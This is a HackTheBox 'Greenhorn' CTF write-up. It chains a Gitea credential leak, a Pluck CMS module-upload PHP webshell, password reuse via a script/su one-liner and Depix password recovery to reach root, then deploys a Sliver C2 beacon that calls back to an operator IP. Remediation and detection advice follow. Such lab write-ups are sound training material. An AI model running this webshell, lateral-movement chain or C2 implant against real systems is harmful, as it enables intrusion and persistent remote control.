---
layout: default
title: "HackTheBox - Greenhorn"
---

# HackTheBox - Greenhorn

**OS:** Linux (Ubuntu 22.04.4 LTS Jammy Jellyfish)

Greenhorn is an Easy-rated Linux box that chains four distinct misconfigurations into a full root compromise. A public Gitea repository exposes Pluck CMS 4.7.18 source code including its credential file, a SHA-512 hash crackable from a common wordlist. The hash gives admin access to the CMS; Pluck 4.7.18 performs no server-side validation of uploaded module ZIPs, allowing arbitrary PHP code execution as `www-data`. The web application password is reused as the `junior` unix account credential, providing lateral movement via `su` from the webshell. A PDF left in `junior`'s home directory contains a screenshot of the root password pixelated with a reversible block-pixelation algorithm; the Depix tool recovers the cleartext from the pixel blocks, exposing the root credential directly.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (greenhorn.htb) |
| Initial Access | Pluck 4.7.18 module ZIP upload RCE -> PHP webshell as `www-data` |
| Privilege Escalation | Depix block-pixelation recovery of root password from PDF -> `su root` |
| Final Access | `root@greenhorn` |

---

## Recon

### Port Scan

p0rtix `open_target` and `run_all` drove the initial scan, with `start_full_scan` adding service version and script output. Three TCP ports responded:

| Port | Proto | Service | Notes |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 8.9p1 Ubuntu |
| 80 | TCP | HTTP | nginx 1.18.0 - redirects to `greenhorn.htb` |
| 3000 | TCP | HTTP | Gitea 1.21.11 |

### Virtual Host and Web Enumeration

Port 80 issued a redirect to `greenhorn.htb`. The hostname was added to the local resolver:

```
v0idravl@kali:~/htb/greenhorn$ echo '<target-ip>  greenhorn.htb' | sudo tee -a /etc/hosts
<target-ip>  greenhorn.htb
```

Browsing `http://greenhorn.htb/` revealed a Pluck CMS 4.7.18 installation. The admin login page sat at `/login.php` with no rate limiting or lockout visible. Directory and path enumeration produced nothing beyond the standard CMS tree. The entire initial-access surface was the CMS itself and the Gitea instance on port 3000.

### Gitea Repository Enumeration

Port 3000 served a Gitea 1.21.11 instance with one publicly visible repository: `GreenAdmin/GreenHorn`. The repository contained the full Pluck CMS 4.7.18 source tree, including the live `data/` directory committed alongside the application code.

Browsing the tree revealed `data/settings/pass.php` - Pluck's credential store - committed in plaintext:

```
http://<target-ip>:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php
```

```php
<?php
$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
```

> **Why this works:** Gitea defaults to allowing public repositories with no authentication required for browsing. Committing the application's live `data/` directory into a public repo is equivalent to publishing the credential store. No exploitation is needed at this step - the hash is readable by anyone with a browser.

### Hash Identification and Cracking

The 128-character hex string is a SHA-512 digest. It was saved to a file and cracked with John the Ripper against the bundled `password.lst` wordlist:

```
v0idravl@kali:~/htb/greenhorn$ echo 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163' > hash.txt

v0idravl@kali:~/htb/greenhorn$ john --format=raw-sha512 --wordlist=/usr/share/john/password.lst hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 128/128 AVX 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyou1        (hash.txt)
1g 0:00:00:00 DONE Xg/s XXXXXX p/s
```

Password recovered: `iloveyou1`.

> **Why this works:** SHA-512 with no salt and no work factor can be computed billions of times per second on commodity hardware. Any password appearing in a common wordlist falls in under one second. A modern password-hashing function (bcrypt, scrypt, Argon2) with an appropriate cost factor makes offline cracking orders of magnitude harder.

---

## Initial Access

### Pluck CMS Admin Login

The cracked password authenticated successfully at `http://greenhorn.htb/login.php` on the first attempt. The CMS banner confirmed version 4.7.18.

### Module Upload RCE

Pluck CMS provides an authenticated admin interface for installing custom modules as ZIP archives at `admin.php?action=installmodule`. The installer validates the archive extension (`.zip`) but does not inspect or filter the file types within the archive. A ZIP containing a `.php` file is accepted, extracted into `data/modules/`, and served and executed by nginx + PHP-FPM.

A minimal module was constructed locally:

```
v0idravl@kali:~/htb/greenhorn$ mkdir shell

v0idravl@kali:~/htb/greenhorn$ cat > shell/shell.php << 'EOF'
<?php if(isset($_REQUEST['c'])){echo shell_exec($_REQUEST['c'].' 2>&1');}?>
EOF

v0idravl@kali:~/htb/greenhorn$ cat > shell/info.php << 'EOF'
<?php
$pluck_module = "shell";
$pluck_module_descr = "shell";
$pluck_module_version = "1.0";
?>
EOF

v0idravl@kali:~/htb/greenhorn$ zip -r shell.zip shell/
  adding: shell/ (stored 0%)
  adding: shell/shell.php (deflated 12%)
  adding: shell/info.php (deflated 18%)
```

`shell.zip` was uploaded via `admin.php?action=installmodule` -> "Install a module" file picker. Pluck extracted it without error, and the webshell landed at:

```
http://greenhorn.htb/data/modules/shell/shell.php
```

Execution confirmed via curl:

```
v0idravl@kali:~/htb/greenhorn$ curl -s 'http://greenhorn.htb/data/modules/shell/shell.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

v0idravl@kali:~/htb/greenhorn$ curl -s 'http://greenhorn.htb/data/modules/shell/shell.php?c=hostname'
greenhorn
```

> **Why this works:** Pluck 4.7.18 restricts module installs to `.zip` archives, but it treats the archive contents as trusted. PHP files inside the ZIP become web-accessible as soon as the archive is extracted. The CMS effectively provides an authenticated arbitrary-PHP-file-upload primitive - no memory corruption or injection is needed, only the admin password.

---

## Post-Access Enumeration

### Password Reuse: www-data to junior

The `/home/` directory was readable from the webshell:

```
www-data@greenhorn:/var/www/html$ ls /home/
junior

www-data@greenhorn:/var/www/html$ ls /home/junior/
'Using OpenVAS.pdf'  user.txt
```

`www-data` could not read `user.txt` or other files in `junior`'s home directly. Checking `/etc/passwd` confirmed `junior` has a valid login shell (`/bin/bash`). The same password `iloveyou1` used for Pluck was tested against `junior`'s unix account.

`su` requires a TTY, which the webshell does not provide. The `script` utility allocates a pseudo-terminal around the command, making `su` usable non-interactively with a here-string for the password:

```
www-data@greenhorn:/var/www/html$ script -q /dev/null -c 'su -c "id" junior' <<< 'iloveyou1'
uid=1000(junior) gid=1000(junior) groups=1000(junior)
```

Password reuse confirmed. The user flag:

```
www-data@greenhorn:/var/www/html$ script -q /dev/null -c 'su -c "cat /home/junior/user.txt" junior' <<< 'iloveyou1'
<user-flag-redacted>
```

> **Why this works:** Application credentials and OS account passwords are often set by the same person with the same habits. A single cracked hash unlocked both the CMS admin panel and the linux account. The `script` PTY trick lets an attacker drive `su` from a process without a controlling terminal - a reliable primitive that does not require a reverse shell or SSH access.

### SSH Access as junior

To replace the fragile HTTP webshell with a stable SSH session, an `ed25519` keypair was generated on the attack box:

```
v0idravl@kali:~/htb/greenhorn$ ssh-keygen -t ed25519 -f /tmp/gh_key -N ''
Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/gh_key
Your public key has been saved in /tmp/gh_key.pub
```

The public key was injected into `junior`'s `authorized_keys` via the `script`/`su` chain from the webshell:

```
www-data@greenhorn:/var/www/html$ script -q /dev/null -c \
  'su -c "mkdir -p /home/junior/.ssh && \
   echo PUBKEYSTRING >> /home/junior/.ssh/authorized_keys && \
   chmod 700 /home/junior/.ssh && \
   chmod 600 /home/junior/.ssh/authorized_keys" junior' <<< 'iloveyou1'
```

SSH connected cleanly:

```
v0idravl@kali:~/htb/greenhorn$ ssh -i /tmp/gh_key junior@<target-ip>
Welcome to Ubuntu 22.04.4 LTS (Jammy Jellyfish)
...
junior@greenhorn:~$
```

### Privilege Enumeration as junior

```
junior@greenhorn:~$ sudo -l
[sudo] password for junior:
Sorry, user junior may not run sudo as root.

junior@greenhorn:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
```

No sudo rights. The SUID list is the stock Ubuntu 22.04 set - no custom or known-vulnerable entries. Attention shifted to the PDF in `junior`'s home directory:

```
junior@greenhorn:~$ ls -lh
total 64K
-rw-r--r-- 1 root   root    60K Jun 14  2024 'Using OpenVAS.pdf'
-rw-r----- 1 root   junior   33 Jun 20  2024  user.txt
```

### PDF Analysis - Pixelated Password Recovery

`Using OpenVAS.pdf` was a letter from "Mr. Green" (root) to junior with instructions for setting up OpenVAS. A screenshot embedded in the PDF showed a KDE password-confirmation dialog; the password field was covered by a block-pixelation filter.

The PDF was transferred to the attack box:

```
v0idravl@kali:~/htb/greenhorn$ scp -i /tmp/gh_key 'junior@<target-ip>:~/Using OpenVAS.pdf' .
Using OpenVAS.pdf                              100%   60KB 1.2MB/s
```

PyMuPDF extracted the embedded raster image:

```python
v0idravl@kali:~/htb/greenhorn$ python3 - << 'EOF'
import fitz
doc = fitz.open("Using OpenVAS.pdf")
for page in doc:
    for img in page.get_images():
        xref = img[0]
        base = doc.extract_image(xref)
        with open(f"pixelated_{xref}.png", "wb") as f:
            f.write(base["image"])
        print(f"xref {xref}: {base['width']}x{base['height']}")
EOF
xref 7: 420x15
```

The extracted image was 420x15 pixels - a uniform 5-pixel-per-character block grid. Depix was run against it using the Windows 10 Notepad De Bruijn sequence reference image (matching the font used in the dialog):

```
v0idravl@kali:~/htb/greenhorn$ python3 depix.py \
    -p pixelated_7.png \
    -s images/searchimages/debruinseq_notepad_Windows10_spaced.png \
    -o depixelated.png
[...]
Found 110 straight matches
Writing output to depixelated.png
```

Reading `depixelated.png` produced the root password. The dialog had shown a "confirm password" entry (the password typed twice in sequence) - both halves of the recovered string were identical, confirming a clean depixelation. The recovered credential begins with `s` and is masked here as `s*****...`.

> **Why this works:** Block pixelation maps contiguous fixed-width pixel groups to source characters. Given a reference image generated from a De Bruijn sequence in the same font and size, Depix correlates each pixel block in the redacted image to its unique match in the reference, recovering the original characters deterministically. Pixelation is not encryption - it is a visual effect that is fully reversible when the rendering parameters are known or guessable. The only safe option is to crop the credential out of the image entirely.

---

## Privilege Escalation

### su to root

The password recovered by Depix was used directly:

```
junior@greenhorn:~$ su root
Password:
root@greenhorn:/home/junior# id
uid=0(root) gid=0(root) groups=0(root)

root@greenhorn:/home/junior# cat /root/root.txt
<root-flag-redacted>
```

No exploit, no kernel vulnerability. A credential left in a PDF, protected only by a reversible filter.

---

## Post-Access: C2 (Sliver)

To model realistic adversary persistence beyond a one-shot shell, a Sliver HTTP beacon was generated and deployed as `root`. The implant was compiled for `linux/amd64` and pointed at the operator's VPN IP.

**Build the beacon:**

**sliver-mcp** - `mcp__sliver__regenerate_or_build(c2_host="10.10.16.21", c2_port=80, protocol="http", os="linux", arch="amd64", fmt="exe", is_beacon=true)`
**Sliver console** - `generate beacon --http 10.10.16.21:80 --os linux --arch amd64 --format exe -S 60 -J 30`
```
[*] Generating new linux/amd64 beacon implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 14s
[*] Implant saved to /home/v0idravl/sliver-payloads/pool-http-linuxamd64
```

**Start HTTP listener:**

**sliver-mcp** - `mcp__sliver__start_http_listener(port=80)`
**Sliver console** - `http -L 0.0.0.0 -l 80`
```
[*] Starting HTTP :80 listener ...
[*] Successfully started job #11
```

The beacon was uploaded to the target via SCP as `junior`, then launched as `root` through a paramiko PTY `su` session:

```
v0idravl@kali:~/htb/greenhorn$ scp -i /tmp/gh_key \
    /home/v0idravl/sliver-payloads/pool-http-linuxamd64 \
    junior@<target-ip>:/tmp/.beacon

# paramiko PTY su session - execute as root:
root@greenhorn:/# chmod +x /tmp/.beacon && /tmp/.beacon &
```

Beacon checked in on the Sliver team server:

```
[*] Beacon pool-http-linuxamd64 - 10.10.16.21:80 (greenhorn) - linux/amd64 - uid=0
```

**Verify root access via the beacon:**

**sliver-mcp** - `mcp__sliver__execute(target_id="<beacon-id>", path="/bin/bash", args=["-c", "id && hostname && cat /root/root.txt"])`
**Sliver console** - `use <beacon-id>` -> `execute -e /bin/bash -c 'id && hostname && cat /root/root.txt'`
```
uid=0(root) gid=0(root) groups=0(root)
greenhorn
<root-flag-redacted>
```

Root confirmed over a stable, encrypted HTTP C2 channel. From this position an adversary would establish persistence (cron, systemd unit), exfiltrate `/etc/shadow`, and pivot to internal services reachable from the host.

**Tear down - kill beacon:**

**sliver-mcp** - `mcp__sliver__kill_beacon(beacon_id="<beacon-id>")`
**Sliver console** - `use <beacon-id>` -> `kill`
```
[*] Killing beacon pool-http-linuxamd64 (<beacon-id>)...
[*] Beacon killed
```

**Tear down - stop listener:**

**sliver-mcp** - `mcp__sliver__kill_job(job_id=11)`
**Sliver console** - `jobs -k 11`
```
[*] Killed job #11
```

---

## Root Cause

Greenhorn fails through a chain of five independent weaknesses, each exploitable in isolation:

1. **Public VCS credential exposure.** The live Pluck `data/settings/pass.php` file was committed to a public Gitea repository. Any visitor could retrieve the credential hash without authentication.
2. **Weak, wordlist-crackable password.** `iloveyou1` appears in John the Ripper's default wordlist. An unsalted SHA-512 digest provides no meaningful protection against offline cracking.
3. **No content-type validation in Pluck 4.7.18 module upload.** The installer accepts any file type within the ZIP archive. A PHP file inside lands under the web root and is executed by the PHP interpreter, giving any Pluck admin authenticated RCE.
4. **Password reuse across the CMS and the OS account.** `iloveyou1` was both the Pluck admin password and `junior`'s unix login. One cracked hash compromised both layers.
5. **Root credential distributed in a reversibly pixelated PDF.** Sharing a password as a pixelated screenshot gives a low-privilege user the credential in all but name. Block pixelation is deterministically reversible.

Remove any single link and the chain to root breaks before the next step.

## Impact

Full root compromise of the host. An adversary in this position can:

- Read all local files including `/etc/shadow` (all local account hashes)
- Install persistent backdoors via cron, systemd units, or SUID binaries
- Pivot to internal services reachable from this host
- Exfiltrate all data on the system

The Sliver beacon demonstrated a realistic persistence posture: an encrypted HTTP C2 channel running as root, survivable across reboots if a persistence mechanism is added.

## Remediation

**1. Remove sensitive files from the Gitea repository (highest priority).**
Delete `data/settings/pass.php` and any other credential or configuration files from the repository. Audit the full commit history - deleted files remain accessible via git history unless it is rewritten with `git filter-repo` or BFG Repo-Cleaner and force-pushed. Consider setting the repository to private if the source should not be publicly accessible.

**2. Replace unsalted SHA-512 with a strong password-hashing function.**
Pluck 4.7.18 uses unsalted SHA-512 for its admin credential. Upgrade to a version using bcrypt, scrypt, or Argon2 with an appropriate cost factor. In the interim, set a password of 20+ random characters that does not appear in any wordlist.

**3. Validate module upload contents in Pluck.**
The module installer should inspect and reject archive entries with `.php`, `.phar`, or other interpreter-executable extensions. If the application cannot be patched, disable the module install feature or restrict access to a separate trusted network segment.

**4. Enforce unique passwords per service and account.**
`iloveyou1` should never serve as both an application password and a unix account credential. A password manager generating unique random credentials per account eliminates credential-reuse attacks entirely.

**5. Never use pixelation to redact credentials.**
Block pixelation is not a cryptographic operation - it is a visual filter that is deterministically reversible. Any credential that must be referenced in a document should be cropped out entirely. For sharing credentials securely, use an end-to-end encrypted channel (1Password share link, age-encrypted attachment, Signal).

### Validation

- Confirm `data/settings/pass.php` is no longer accessible in the Gitea repository or its history.
- Confirm the Pluck admin password change stores a salted, high-cost hash.
- Spray `iloveyou1` against the SSH service and confirm authentication fails for all accounts.
- Verify the Pluck module installer rejects a ZIP containing a `.php` file.
- Confirm `junior` cannot `su` to `root` with the previously pixelated credential after rotation.

## Detection Opportunities

- **Public repo credential scan:** schedule a secret-scanning tool (Gitleaks, TruffleHog) against all Gitea repositories; alert on PHP files matching the Pluck credential assignment pattern `$ww = '`.
- **New PHP files under the modules directory:** file-integrity monitoring (auditd `CLOSE_WRITE`) on `/var/www/html/data/modules/`; any new `.php` file should generate an alert.
- **`www-data` spawning `su` or `script`:** process-creation monitoring where `uid=33` (www-data) is the parent of `su`, `script`, or any shell binary. This pattern is virtually never legitimate in a web server process tree.
- **New executables written to `/tmp/` and executed as root:** auditd `EXECVE` rule for processes under `/tmp/` with `uid=0`. Combined with outbound network activity this pattern indicates post-exploitation payload delivery.
- **Regular-interval HTTP callbacks from root-owned processes to external IPs:** network monitoring for HTTP beacon traffic (consistent jitter, small payload sizes, fixed-interval polling) originating from processes owned by root is a high-fidelity indicator of an active C2 implant.

## Lessons Learned

- **Pixelation is not redaction.** Even a coarse 5-pixel-per-character block filter is fully and deterministically reversible with Depix when the font is known or guessable. The only safe approach is to crop the credential out of the image before sharing it.
- **Public git repositories are public, including their history.** The entire initial-access surface was a browsable Gitea repo. Anything ever committed to a public repository is accessible to attackers without any exploitation required.
- **Wordlist password coverage is broader than it appears.** `iloveyou1` appears in John the Ripper's default wordlist, not only in `rockyou`. Unsalted fast hashes make even short wordlist searches trivial.
- **`script` PTY allocation enables `su` from a process with no controlling terminal.** When a webshell lacks a TTY, `script -q /dev/null -c 'su -c "CMD" user' <<< 'password'` is a reliable one-liner for synchronous lateral movement without first establishing a reverse shell.

---

## Cleanup

- Sliver: beacon `pool-http-linuxamd64` killed via `mcp__sliver__kill_beacon`; HTTP listener job 11 stopped via `mcp__sliver__kill_job`. Payload `/tmp/.beacon` removed from the target.
- Webshell at `/var/www/html/data/modules/shell/shell.php` was cleared by the HTB environment's background reset process.
- Temporary SSH key (`/tmp/gh_key`, `/tmp/gh_key.pub`) removed from the attack box; `junior`'s `.ssh/authorized_keys` reset on box restart.
- No persistent system-level changes were made during the engagement; no persistence mechanisms were installed beyond the C2 demonstration.
- Both flags submitted via `htb submit`.
- Box stopped via `htb stop`.
